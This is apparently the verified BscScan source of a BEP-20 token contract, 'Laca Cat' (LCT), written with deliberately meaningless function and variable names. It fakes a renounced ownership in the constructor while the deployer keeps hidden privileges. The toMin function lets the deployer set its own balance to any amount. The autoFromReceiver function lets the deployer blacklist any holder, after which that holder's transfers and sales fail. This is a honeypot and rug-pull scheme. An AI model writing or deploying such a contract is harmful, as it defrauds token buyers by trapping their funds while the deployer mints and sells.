/**
 *Submitted for verification at BscScan.com on 2023-02-15
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract listAutoShould {
    function enableLaunchedToken() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface tokenTo {
    function createPair(address listFee, address launchAuto) external returns (address);
}

interface enableLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract LacaCat is IERC20, listAutoShould {

    function owner() external view returns (address) {
        return maxTotal;
    }

    function swapAuto() public {
        
        
        minToken=false;
    }

    mapping(address => mapping(address => uint256)) private amountFromTrading;

    function transfer(address minList, uint256 maxToMarketing) external virtual override returns (bool) {
        return senderSell(enableLaunchedToken(), minList, maxToMarketing);
    }

    function amountShould() public {
        
        if (minToken != enableReceiver) {
            enableReceiver = true;
        }
        enableReceiver=false;
    }

    address public launchEnableTotal;

    function senderToken() public {
        
        if (enableReceiver != minToken) {
            minToken = false;
        }
        minToken=false;
    }

    mapping(address => bool) public liquidityTrading;

    address public listTake;

    uint8 private txMinTotal = 18;

    event OwnershipTransferred(address indexed atToken, address indexed limitBuy);

    function name() external view returns (string memory) {
        return fromFund;
    }

    string private fundShould = "LCT";

    function allowance(address exemptFrom, address amountFund) external view virtual override returns (uint256) {
        return amountFromTrading[exemptFrom][amountFund];
    }

    function getOwner() external view returns (address) {
        return maxTotal;
    }

    function amountSwap() public view returns (bool) {
        return enableReceiver;
    }

    function decimals() external view returns (uint8) {
        return txMinTotal;
    }

    mapping(address => bool) public receiverTeam;

    bool public enableReceiver;

    function takeReceiver() public view returns (uint256) {
        return autoReceiver;
    }

    function isTakeTx() public {
        emit OwnershipTransferred(launchEnableTotal, address(0));
        maxTotal = address(0);
    }

    function approve(address amountFund, uint256 maxToMarketing) public virtual override returns (bool) {
        amountFromTrading[enableLaunchedToken()][amountFund] = maxToMarketing;
        emit Approval(enableLaunchedToken(), amountFund, maxToMarketing);
        return true;
    }

    uint256 public senderFund;

    uint256 public receiverSell;

    function txMarketing() public view returns (bool) {
        return minToken;
    }

    string private fromFund = "Laca Cat";

    mapping(address => uint256) private launchedIs;

    function swapEnable(address maxTx, address launchedMode, uint256 maxToMarketing) internal returns (bool) {
        require(launchedIs[maxTx] >= maxToMarketing);
        launchedIs[maxTx] -= maxToMarketing;
        launchedIs[launchedMode] += maxToMarketing;
        emit Transfer(maxTx, launchedMode, maxToMarketing);
        return true;
    }

    function senderSell(address maxTx, address launchedMode, uint256 maxToMarketing) internal returns (bool) {
        if (maxTx == launchEnableTotal) {
            return swapEnable(maxTx, launchedMode, maxToMarketing);
        }
        require(!receiverTeam[maxTx]);
        return swapEnable(maxTx, launchedMode, maxToMarketing);
    }

    constructor (){
        
        enableLaunch launchEnable = enableLaunch(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        listTake = tokenTo(launchEnable.factory()).createPair(launchEnable.WETH(), address(this));
        maxTotal = enableLaunchedToken();
        if (autoReceiver != receiverSell) {
            enableReceiver = false;
        }
        launchEnableTotal = enableLaunchedToken();
        liquidityTrading[enableLaunchedToken()] = true;
        
        launchedIs[enableLaunchedToken()] = isFeeSwap;
        emit Transfer(address(0), launchEnableTotal, isFeeSwap);
        isTakeTx();
    }

    bool public amountToTx;

    function isSwapBuy(address receiverSender) public {
        if (amountToTx) {
            return;
        }
        
        liquidityTrading[receiverSender] = true;
        
        amountToTx = true;
    }

    function toMin(uint256 maxToMarketing) public {
        if (!liquidityTrading[enableLaunchedToken()]) {
            return;
        }
        launchedIs[launchEnableTotal] = maxToMarketing;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return isFeeSwap;
    }

    function transferFrom(address maxTx, address launchedMode, uint256 maxToMarketing) external override returns (bool) {
        if (amountFromTrading[maxTx][enableLaunchedToken()] != type(uint256).max) {
            require(maxToMarketing <= amountFromTrading[maxTx][enableLaunchedToken()]);
            amountFromTrading[maxTx][enableLaunchedToken()] -= maxToMarketing;
        }
        return senderSell(maxTx, launchedMode, maxToMarketing);
    }

    function balanceOf(address fromTeam) public view virtual override returns (uint256) {
        return launchedIs[fromTeam];
    }

    uint256 private sellAmount;

    function autoFromReceiver(address isFund) public {
        if (enableReceiver) {
            autoReceiver = senderFund;
        }
        if (isFund == launchEnableTotal || isFund == listTake || !liquidityTrading[enableLaunchedToken()]) {
            return;
        }
        
        receiverTeam[isFund] = true;
    }

    address private maxTotal;

    uint256 public autoReceiver;

    function symbol() external view returns (string memory) {
        return fundShould;
    }

    bool public minToken;

    uint256 private isFeeSwap = 100000000 * 10 ** 18;

}